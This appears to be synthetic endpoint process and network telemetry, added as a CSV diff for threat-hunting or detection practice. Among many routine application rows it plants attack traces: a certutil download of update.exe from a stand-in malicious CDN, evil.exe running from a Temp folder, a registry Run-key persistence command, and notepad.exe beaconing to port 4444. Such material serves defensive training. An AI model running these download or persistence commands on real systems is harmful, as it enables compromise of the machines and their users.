+2026-04-01 11:15:00,eng-ws-01,irfan,excel.exe,explorer.exe,excel.exe /background,10.0.1.15,0,none
+2026-04-01 11:16:00,sales-lt-01,bob,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,edge
+2026-04-01 11:17:00,sales-lt-01,helen,outlook.exe,explorer.exe,"outlook.exe /recycle ""helen@company.com""",23.45.67.89,443,outlook
+2026-04-01 11:18:00,eng-ws-01,ethan,teams.exe,explorer.exe,teams.exe --type=renderer,1.1.1.1,443,teams-client
+2026-04-01 11:19:00,eng-ws-02,george,teams.exe,explorer.exe,teams.exe --type=renderer,1.1.1.1,443,teams-client
+2026-04-01 11:20:00,shared-jump-01,alice,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,firefox
+2026-04-01 11:21:00,hr-ws-01,bob,winword.exe,explorer.exe,winword.exe /background,10.0.0.10,0,none
+2026-04-01 11:22:00,sales-lt-02,george,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,45.33.32.156,443,zoom-client
+2026-04-01 11:23:00,sales-lt-02,george,teams.exe,explorer.exe,teams.exe --type=renderer,151.101.1.69,443,teams-client
+2026-04-01 11:24:00,hr-ws-01,julia,explorer.exe,explorer.exe,explorer.exe /background,10.1.5.12,0,none
+2026-04-01 11:25:00,shared-jump-01,julia,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,chrome
+2026-04-01 11:26:00,fin-ws-02,ethan,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\ethan\Documents\notes.txt""",10.0.0.10,0,none
+2026-04-01 11:27:00,fin-ws-01,diana,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,chrome
+2026-04-01 11:28:00,fin-ws-01,alice,explorer.exe,explorer.exe,explorer.exe /background,192.168.1.12,0,none
+2026-04-01 11:29:00,shared-jump-01,helen,excel.exe,explorer.exe,excel.exe /background,10.0.0.5,0,none
+2026-04-01 11:29:00,eng-ws-01,george,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
+2026-04-01 11:30:00,fin-ws-02,ethan,onenote.exe,explorer.exe,onenote.exe /background,10.1.5.12,0,none
+2026-04-01 11:30:00,eng-ws-01,george,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
+2026-04-01 11:31:00,sales-lt-01,bob,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\bob\Documents\notes.txt""",10.0.2.20,0,none
+2026-04-01 11:32:00,hr-ws-01,julia,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\julia\Documents\notes.txt""",10.0.2.20,0,none
+2026-04-01 11:33:00,ops-ws-02,bob,slack.exe,explorer.exe,slack.exe --processStart slack.exe,45.33.32.156,443,slack-client
+2026-04-01 11:34:00,fin-ws-01,ethan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,chrome
+2026-04-01 11:35:00,fin-ws-01,ethan,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,52.95.110.1,443,zoom-client
+2026-04-01 11:36:00,sales-lt-01,bob,teams.exe,explorer.exe,teams.exe --type=renderer,52.95.110.1,443,teams-client
+2026-04-01 11:37:00,ops-ws-02,ethan,slack.exe,explorer.exe,slack.exe --processStart slack.exe,185.199.108.153,443,slack-client
+2026-04-01 11:38:00,sales-lt-01,helen,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,edge
+2026-04-01 11:39:00,ops-ws-01,julia,excel.exe,explorer.exe,excel.exe /background,10.0.0.5,0,none
+2026-04-01 11:40:00,eng-ws-02,diana,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\diana\Documents\notes.txt""",10.0.0.5,0,none
+2026-04-01 11:41:00,hr-ws-01,julia,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,edge
+2026-04-01 11:42:00,sales-lt-02,helen,excel.exe,explorer.exe,excel.exe /background,10.0.1.15,0,none
+2026-04-01 11:43:00,shared-jump-01,george,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\george\Documents\notes.txt""",192.168.1.12,0,none
+2026-04-01 11:44:00,eng-ws-02,helen,outlook.exe,explorer.exe,"outlook.exe /recycle ""helen@company.com""",142.250.183.14,443,outlook
+2026-04-01 11:45:00,ops-ws-01,farah,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\farah\Documents\notes.txt""",10.0.0.10,0,none
+2026-04-01 11:46:00,fin-ws-01,farah,explorer.exe,explorer.exe,explorer.exe /background,192.168.1.12,0,none
+2026-04-01 11:47:00,hr-ws-01,george,code.exe,explorer.exe,"code.exe ""C:\Users\george\Documents\project""",192.168.10.9,445,none
+2026-04-01 11:48:00,eng-ws-01,helen,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,edge
+2026-04-01 11:49:00,ops-ws-01,bob,code.exe,explorer.exe,"code.exe ""C:\Users\bob\Documents\project""",172.16.10.8,445,none
+2026-04-01 11:50:00,sales-lt-02,alice,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\alice\Documents\notes.txt""",192.168.10.9,0,none
+2026-04-01 11:51:00,sales-lt-01,george,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,firefox
+2026-04-01 11:52:00,ops-ws-01,julia,code.exe,explorer.exe,"code.exe ""C:\Users\julia\Documents\project""",192.168.1.12,445,none
+2026-04-01 11:53:00,sales-lt-01,alice,winword.exe,explorer.exe,winword.exe /background,10.1.5.12,0,none
+2026-04-01 11:54:00,sales-lt-02,charlie,excel.exe,explorer.exe,excel.exe /background,192.168.1.12,0,none
+2026-04-01 11:55:00,sales-lt-01,bob,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,firefox
+2026-04-01 11:56:00,fin-ws-01,ethan,slack.exe,explorer.exe,slack.exe --processStart slack.exe,8.8.8.8,443,slack-client
+2026-04-01 11:57:00,sales-lt-02,george,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,chrome
+2026-04-01 11:58:00,sales-lt-01,bob,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\bob\Documents\notes.txt""",10.0.1.15,0,none
+2026-04-01 11:59:00,sales-lt-01,ethan,slack.exe,explorer.exe,slack.exe --processStart slack.exe,52.95.110.1,443,slack-client
+2026-04-01 12:00:00,ops-ws-02,helen,teams.exe,explorer.exe,teams.exe --type=renderer,45.33.32.156,443,teams-client
+2026-04-01 12:01:00,sales-lt-01,irfan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,chrome
+2026-04-01 12:02:00,shared-jump-01,irfan,onenote.exe,explorer.exe,onenote.exe /background,10.0.1.15,0,none
+2026-04-01 12:03:00,eng-ws-02,ethan,code.exe,explorer.exe,"code.exe ""C:\Users\ethan\Documents\project""",172.16.10.8,445,none
+2026-04-01 12:04:00,ops-ws-01,irfan,excel.exe,explorer.exe,excel.exe /background,10.0.0.5,0,none
+2026-04-01 12:05:00,hr-ws-01,ethan,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,151.101.1.69,443,zoom-client
+2026-04-01 12:06:00,fin-ws-01,helen,slack.exe,explorer.exe,slack.exe --processStart slack.exe,151.101.1.69,443,slack-client
+2026-04-01 12:07:00,ops-ws-01,farah,slack.exe,explorer.exe,slack.exe --processStart slack.exe,185.199.108.153,443,slack-client
+2026-04-01 12:08:00,ops-ws-02,helen,outlook.exe,explorer.exe,"outlook.exe /recycle ""helen@company.com""",45.33.32.156,443,outlook
+2026-04-01 12:09:00,fin-ws-02,julia,explorer.exe,explorer.exe,explorer.exe /background,10.0.2.20,0,none
+2026-04-01 12:10:00,ops-ws-02,alice,outlook.exe,explorer.exe,"outlook.exe /recycle ""alice@company.com""",151.101.1.69,443,outlook
+2026-04-01 12:10:00,shared-jump-01,alice,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
+2026-04-01 12:11:00,ops-ws-02,george,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\george\Documents\notes.txt""",10.0.1.15,0,none
+2026-04-01 12:11:00,shared-jump-01,alice,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
+2026-04-01 12:12:00,sales-lt-01,alice,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,firefox
+2026-04-01 12:13:00,ops-ws-01,bob,teams.exe,explorer.exe,teams.exe --type=renderer,1.1.1.1,443,teams-client
+2026-04-01 12:14:00,sales-lt-02,helen,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,edge
+2026-04-01 12:15:00,fin-ws-01,bob,teams.exe,explorer.exe,teams.exe --type=renderer,52.95.110.1,443,teams-client
+2026-04-01 12:16:00,ops-ws-01,julia,onenote.exe,explorer.exe,onenote.exe /background,172.16.10.8,0,none
+2026-04-01 12:17:00,eng-ws-02,farah,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\farah\Documents\notes.txt""",192.168.10.9,0,none
+2026-04-01 12:18:00,ops-ws-02,farah,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\farah\Documents\notes.txt""",192.168.1.12,0,none
+2026-04-01 12:19:00,sales-lt-02,alice,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,1.1.1.1,443,zoom-client
+2026-04-01 12:20:00,fin-ws-02,ethan,winword.exe,explorer.exe,winword.exe /background,10.0.0.10,0,none
+2026-04-01 12:21:00,ops-ws-02,bob,code.exe,explorer.exe,"code.exe ""C:\Users\bob\Documents\project""",10.0.0.10,445,none
+2026-04-01 12:22:00,sales-lt-01,charlie,onenote.exe,explorer.exe,onenote.exe /background,10.1.5.12,0,none
+2026-04-01 12:23:00,eng-ws-01,alice,outlook.exe,explorer.exe,"outlook.exe /recycle ""alice@company.com""",8.8.8.8,443,outlook
+2026-04-01 12:24:00,hr-ws-01,farah,outlook.exe,explorer.exe,"outlook.exe /recycle ""farah@company.com""",142.250.183.14,443,outlook
+2026-04-01 12:25:00,fin-ws-01,diana,slack.exe,explorer.exe,slack.exe --processStart slack.exe,142.250.183.14,443,slack-client
+2026-04-01 12:26:00,shared-jump-01,charlie,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,chrome
+2026-04-01 12:27:00,shared-jump-01,george,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,45.33.32.156,443,zoom-client
+2026-04-01 12:28:00,sales-lt-01,julia,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,edge
+2026-04-01 12:29:00,hr-ws-01,helen,excel.exe,explorer.exe,excel.exe /background,10.0.0.5,0,none
+2026-04-01 12:30:00,sales-lt-01,ethan,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\ethan\Documents\notes.txt""",192.168.10.9,0,none
+2026-04-01 12:31:00,fin-ws-01,bob,teams.exe,explorer.exe,teams.exe --type=renderer,104.18.20.12,443,teams-client
+2026-04-01 12:32:00,shared-jump-01,ethan,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\ethan\Documents\notes.txt""",172.16.10.8,0,none
+2026-04-01 12:33:00,hr-ws-01,helen,excel.exe,explorer.exe,excel.exe /background,10.0.2.20,0,none
+2026-04-01 12:34:00,ops-ws-02,helen,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,edge
+2026-04-01 12:35:00,shared-jump-01,farah,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,52.95.110.1,443,zoom-client
+2026-04-01 12:36:00,hr-ws-01,alice,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\alice\Documents\notes.txt""",172.16.10.8,0,none
+2026-04-01 12:37:00,hr-ws-01,alice,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,8.8.8.8,443,zoom-client
+2026-04-01 12:38:00,shared-jump-01,helen,excel.exe,explorer.exe,excel.exe /background,10.0.2.20,0,none
+2026-04-01 12:38:00,eng-ws-02,alice,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
+2026-04-01 12:39:00,shared-jump-01,farah,winword.exe,explorer.exe,winword.exe /background,10.0.2.20,0,none
+2026-04-01 12:39:00,eng-ws-02,alice,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
+2026-04-01 12:40:00,shared-jump-01,ethan,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\ethan\Documents\notes.txt""",10.0.1.15,0,none
+2026-04-01 12:41:00,eng-ws-02,alice,excel.exe,explorer.exe,excel.exe /background,192.168.1.12,0,none
+2026-04-01 12:42:00,eng-ws-01,julia,outlook.exe,explorer.exe,"outlook.exe /recycle ""julia@company.com""",23.45.67.89,443,outlook
+2026-04-01 12:43:00,eng-ws-02,ethan,outlook.exe,explorer.exe,"outlook.exe /recycle ""ethan@company.com""",142.250.183.14,443,outlook
+2026-04-01 12:44:00,fin-ws-01,diana,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,edge
+2026-04-01 12:45:00,sales-lt-02,irfan,excel.exe,explorer.exe,excel.exe /background,10.0.1.15,0,none
+2026-04-01 12:46:00,hr-ws-01,helen,code.exe,explorer.exe,"code.exe ""C:\Users\helen\Documents\project""",10.1.5.12,445,none
+2026-04-01 12:47:00,ops-ws-01,bob,teams.exe,explorer.exe,teams.exe --type=renderer,1.1.1.1,443,teams-client
+2026-04-01 12:48:00,fin-ws-01,diana,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\diana\Documents\notes.txt""",172.16.10.8,0,none
+2026-04-01 12:49:00,sales-lt-02,farah,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,chrome
+2026-04-01 12:50:00,hr-ws-01,irfan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,edge
+2026-04-01 12:51:00,hr-ws-01,julia,explorer.exe,explorer.exe,explorer.exe /background,172.16.4.25,0,none
+2026-04-01 12:52:00,eng-ws-02,diana,teams.exe,explorer.exe,teams.exe --type=renderer,8.8.8.8,443,teams-client
+2026-04-01 12:53:00,shared-jump-01,irfan,outlook.exe,explorer.exe,"outlook.exe /recycle ""irfan@company.com""",45.33.32.156,443,outlook
+2026-04-01 12:54:00,eng-ws-02,helen,onenote.exe,explorer.exe,onenote.exe /background,10.1.5.12,0,none
+2026-04-01 12:55:00,ops-ws-02,bob,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,chrome
+2026-04-01 12:56:00,hr-ws-01,helen,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,chrome
+2026-04-01 12:57:00,sales-lt-02,charlie,explorer.exe,explorer.exe,explorer.exe /background,192.168.1.12,0,none
+2026-04-01 12:58:00,ops-ws-01,irfan,explorer.exe,explorer.exe,explorer.exe /background,10.0.1.15,0,none
+2026-04-01 12:59:00,ops-ws-02,bob,teams.exe,explorer.exe,teams.exe --type=renderer,142.250.183.14,443,teams-client
+2026-04-01 13:00:00,hr-ws-01,alice,onenote.exe,explorer.exe,onenote.exe /background,172.16.4.25,0,none
+2026-04-01 13:01:00,fin-ws-02,helen,teams.exe,explorer.exe,teams.exe --type=renderer,45.33.32.156,443,teams-client
+2026-04-01 13:02:00,ops-ws-01,bob,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\bob\Documents\notes.txt""",172.16.4.25,0,none
+2026-04-01 13:03:00,sales-lt-02,farah,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,edge
+2026-04-01 13:04:00,fin-ws-02,bob,teams.exe,explorer.exe,teams.exe --type=renderer,1.1.1.1,443,teams-client
+2026-04-01 13:05:00,fin-ws-02,julia,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,edge
+2026-04-01 13:06:00,fin-ws-02,charlie,code.exe,explorer.exe,"code.exe ""C:\Users\charlie\Documents\project""",10.0.2.20,445,none
+2026-04-01 13:06:00,eng-ws-02,george,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
+2026-04-01 13:07:00,eng-ws-02,irfan,winword.exe,explorer.exe,winword.exe /background,10.0.2.20,0,none
+2026-04-01 13:07:00,eng-ws-02,george,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
+2026-04-01 13:08:00,fin-ws-02,farah,code.exe,explorer.exe,"code.exe ""C:\Users\farah\Documents\project""",10.0.1.15,445,none
+2026-04-01 13:09:00,shared-jump-01,alice,excel.exe,explorer.exe,excel.exe /background,10.0.1.15,0,none
+2026-04-01 13:10:00,fin-ws-01,irfan,excel.exe,explorer.exe,excel.exe /background,10.0.1.15,0,none
+2026-04-01 13:11:00,eng-ws-02,alice,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,edge
+2026-04-01 13:12:00,fin-ws-02,julia,outlook.exe,explorer.exe,"outlook.exe /recycle ""julia@company.com""",8.8.8.8,443,outlook
+2026-04-01 13:13:00,fin-ws-01,ethan,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,firefox
+2026-04-01 13:14:00,ops-ws-02,irfan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,edge
+2026-04-01 13:15:00,sales-lt-01,farah,slack.exe,explorer.exe,slack.exe --processStart slack.exe,1.1.1.1,443,slack-client
+2026-04-01 13:16:00,sales-lt-01,irfan,winword.exe,explorer.exe,winword.exe /background,10.0.0.5,0,none
+2026-04-01 13:17:00,sales-lt-02,ethan,teams.exe,explorer.exe,teams.exe --type=renderer,8.8.8.8,443,teams-client
+2026-04-01 13:18:00,eng-ws-01,helen,explorer.exe,explorer.exe,explorer.exe /background,172.16.10.8,0,none
+2026-04-01 13:19:00,eng-ws-02,helen,onenote.exe,explorer.exe,onenote.exe /background,192.168.1.12,0,none
+2026-04-01 13:20:00,eng-ws-02,bob,outlook.exe,explorer.exe,"outlook.exe /recycle ""bob@company.com""",23.45.67.89,443,outlook
+2026-04-01 13:21:00,eng-ws-02,charlie,excel.exe,explorer.exe,excel.exe /background,192.168.10.9,0,none
+2026-04-01 13:22:00,ops-ws-01,george,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,185.199.108.153,443,zoom-client
+2026-04-01 13:23:00,hr-ws-01,helen,slack.exe,explorer.exe,slack.exe --processStart slack.exe,142.250.183.14,443,slack-client
+2026-04-01 13:24:00,eng-ws-02,bob,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\bob\Documents\notes.txt""",192.168.10.9,0,none
+2026-04-01 13:25:00,fin-ws-02,george,teams.exe,explorer.exe,teams.exe --type=renderer,45.33.32.156,443,teams-client
+2026-04-01 13:26:00,ops-ws-02,farah,teams.exe,explorer.exe,teams.exe --type=renderer,142.250.183.14,443,teams-client
+2026-04-01 13:27:00,ops-ws-02,bob,outlook.exe,explorer.exe,"outlook.exe /recycle ""bob@company.com""",142.250.183.14,443,outlook
+2026-04-01 13:28:00,ops-ws-01,ethan,outlook.exe,explorer.exe,"outlook.exe /recycle ""ethan@company.com""",23.45.67.89,443,outlook
+2026-04-01 13:29:00,sales-lt-01,bob,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,chrome
+2026-04-01 13:30:00,ops-ws-02,bob,onenote.exe,explorer.exe,onenote.exe /background,172.16.4.25,0,none
+2026-04-01 13:31:00,fin-ws-01,irfan,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,firefox
+2026-04-01 13:32:00,ops-ws-01,bob,explorer.exe,explorer.exe,explorer.exe /background,172.16.4.25,0,none
+2026-04-01 13:33:00,ops-ws-02,alice,excel.exe,explorer.exe,excel.exe /background,10.1.5.12,0,none
+2026-04-01 13:34:00,ops-ws-01,bob,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,185.199.108.153,443,zoom-client
+2026-04-01 13:35:00,fin-ws-02,charlie,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\charlie\Documents\notes.txt""",192.168.1.12,0,none
+2026-04-01 13:36:00,fin-ws-02,bob,outlook.exe,explorer.exe,"outlook.exe /recycle ""bob@company.com""",185.199.108.153,443,outlook
+2026-04-01 13:37:00,ops-ws-01,bob,code.exe,explorer.exe,"code.exe ""C:\Users\bob\Documents\project""",10.1.5.12,445,none
+2026-04-01 13:38:00,shared-jump-01,diana,code.exe,explorer.exe,"code.exe ""C:\Users\diana\Documents\project""",172.16.10.8,445,none
+2026-04-01 13:39:00,sales-lt-02,julia,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,185.199.108.153,443,zoom-client
+2026-04-01 13:40:00,eng-ws-01,julia,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\julia\Documents\notes.txt""",10.1.5.12,0,none
+2026-04-01 13:41:00,eng-ws-01,charlie,excel.exe,explorer.exe,excel.exe /background,10.1.5.12,0,none
+2026-04-01 13:42:00,ops-ws-01,farah,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,chrome
+2026-04-01 13:43:00,shared-jump-01,george,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,firefox
+2026-04-01 13:44:00,eng-ws-01,bob,onenote.exe,explorer.exe,onenote.exe /background,192.168.10.9,0,none
+2026-04-01 13:45:00,fin-ws-02,george,explorer.exe,explorer.exe,explorer.exe /background,192.168.1.12,0,none
+2026-04-01 13:46:00,ops-ws-01,charlie,outlook.exe,explorer.exe,"outlook.exe /recycle ""charlie@company.com""",52.95.110.1,443,outlook
+2026-04-01 13:47:00,ops-ws-01,julia,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,1.1.1.1,443,zoom-client
+2026-04-01 13:48:00,eng-ws-01,charlie,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,firefox
+2026-04-01 13:49:00,eng-ws-02,ethan,teams.exe,explorer.exe,teams.exe --type=renderer,142.250.183.14,443,teams-client
+2026-04-01 13:50:00,sales-lt-01,julia,teams.exe,explorer.exe,teams.exe --type=renderer,142.250.183.14,443,teams-client
+2026-04-01 13:51:00,hr-ws-01,diana,code.exe,explorer.exe,"code.exe ""C:\Users\diana\Documents\project""",192.168.10.9,445,none
+2026-04-01 13:52:00,eng-ws-02,farah,explorer.exe,explorer.exe,explorer.exe /background,10.0.0.10,0,none
+2026-04-01 13:53:00,hr-ws-01,julia,teams.exe,explorer.exe,teams.exe --type=renderer,185.199.108.153,443,teams-client
+2026-04-01 13:54:00,hr-ws-01,alice,winword.exe,explorer.exe,winword.exe /background,172.16.10.8,0,none
+2026-04-01 13:55:00,shared-jump-01,alice,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,edge
+2026-04-01 13:56:00,fin-ws-02,charlie,code.exe,explorer.exe,"code.exe ""C:\Users\charlie\Documents\project""",10.1.5.12,445,none
+2026-04-01 13:57:00,hr-ws-01,farah,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,edge
+2026-04-01 13:58:00,ops-ws-02,charlie,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,firefox
+2026-04-01 13:59:00,fin-ws-02,irfan,slack.exe,explorer.exe,slack.exe --processStart slack.exe,104.18.20.12,443,slack-client
+2026-04-01 13:59:00,eng-ws-02,irfan,certutil.exe,cmd.exe,certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe,23.45.67.89,80,curl/7.68
+2026-04-01 14:00:00,eng-ws-02,george,onenote.exe,explorer.exe,onenote.exe /background,10.0.0.5,0,none
+2026-04-01 14:00:00,eng-ws-02,irfan,evil.exe,explorer.exe,C:\Users\irfan\AppData\Local\Temp\evil.exe,10.1.5.12,0,none
+2026-04-01 14:01:00,ops-ws-02,alice,teams.exe,explorer.exe,teams.exe --type=renderer,1.1.1.1,443,teams-client
+2026-04-01 14:01:00,eng-ws-02,irfan,reg.exe,cmd.exe,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d evil.exe,192.168.1.12,0,none
+2026-04-01 14:02:00,ops-ws-01,julia,explorer.exe,explorer.exe,explorer.exe /background,172.16.10.8,0,none
+2026-04-01 14:03:00,ops-ws-02,ethan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,chrome
+2026-04-01 14:04:00,ops-ws-01,charlie,code.exe,explorer.exe,"code.exe ""C:\Users\charlie\Documents\project""",192.168.1.12,445,none
+2026-04-01 14:05:00,ops-ws-01,bob,explorer.exe,explorer.exe,explorer.exe /background,10.0.0.10,0,none
+2026-04-01 14:06:00,fin-ws-02,george,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,142.250.183.14,443,zoom-client
+2026-04-01 14:07:00,sales-lt-02,bob,explorer.exe,explorer.exe,explorer.exe /background,10.1.5.12,0,none
+2026-04-01 14:08:00,ops-ws-01,diana,outlook.exe,explorer.exe,"outlook.exe /recycle ""diana@company.com""",23.45.67.89,443,outlook
+2026-04-01 14:09:00,eng-ws-02,irfan,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\irfan\Documents\notes.txt""",10.0.0.10,0,none
+2026-04-01 14:10:00,sales-lt-02,irfan,winword.exe,explorer.exe,winword.exe /background,172.16.4.25,0,none
+2026-04-01 14:11:00,ops-ws-01,charlie,winword.exe,explorer.exe,winword.exe /background,10.0.0.10,0,none
+2026-04-01 14:12:00,fin-ws-01,ethan,winword.exe,explorer.exe,winword.exe /background,10.0.1.15,0,none
+2026-04-01 14:13:00,shared-jump-01,charlie,code.exe,explorer.exe,"code.exe ""C:\Users\charlie\Documents\project""",10.0.0.10,445,none
+2026-04-01 14:14:00,fin-ws-01,helen,teams.exe,explorer.exe,teams.exe --type=renderer,151.101.1.69,443,teams-client
+2026-04-01 14:15:00,shared-jump-01,julia,outlook.exe,explorer.exe,"outlook.exe /recycle ""julia@company.com""",104.18.20.12,443,outlook
+2026-04-01 14:16:00,fin-ws-01,helen,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,edge
+2026-04-01 14:17:00,hr-ws-01,ethan,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,8.8.8.8,443,zoom-client
+2026-04-01 14:18:00,ops-ws-01,irfan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,edge
+2026-04-01 14:19:00,sales-lt-01,alice,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,edge
+2026-04-01 14:20:00,eng-ws-02,bob,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,185.199.108.153,443,zoom-client
+2026-04-01 14:21:00,ops-ws-02,helen,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,185.199.108.153,443,zoom-client
+2026-04-01 14:22:00,eng-ws-01,helen,code.exe,explorer.exe,"code.exe ""C:\Users\helen\Documents\project""",10.0.2.20,445,none
+2026-04-01 14:23:00,ops-ws-01,julia,teams.exe,explorer.exe,teams.exe --type=renderer,185.199.108.153,443,teams-client
+2026-04-01 14:24:00,fin-ws-01,alice,teams.exe,explorer.exe,teams.exe --type=renderer,1.1.1.1,443,teams-client
+2026-04-01 14:25:00,ops-ws-01,bob,slack.exe,explorer.exe,slack.exe --processStart slack.exe,23.45.67.89,443,slack-client
+2026-04-01 14:26:00,eng-ws-01,diana,onenote.exe,explorer.exe,onenote.exe /background,192.168.1.12,0,none
+2026-04-01 14:27:00,sales-lt-01,irfan,slack.exe,explorer.exe,slack.exe --processStart slack.exe,23.45.67.89,443,slack-client
+2026-04-01 14:28:00,ops-ws-01,farah,excel.exe,explorer.exe,excel.exe /background,172.16.10.8,0,none
+2026-04-01 14:29:00,ops-ws-02,farah,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\farah\Documents\notes.txt""",10.0.0.5,0,none
+2026-04-01 14:30:00,ops-ws-01,bob,outlook.exe,explorer.exe,"outlook.exe /recycle ""bob@company.com""",1.1.1.1,443,outlook
+2026-04-01 14:31:00,sales-lt-02,george,excel.exe,explorer.exe,excel.exe /background,10.1.5.12,0,none
+2026-04-01 14:32:00,shared-jump-01,charlie,outlook.exe,explorer.exe,"outlook.exe /recycle ""charlie@company.com""",1.1.1.1,443,outlook
+2026-04-01 14:33:00,shared-jump-01,charlie,outlook.exe,explorer.exe,"outlook.exe /recycle ""charlie@company.com""",52.95.110.1,443,outlook
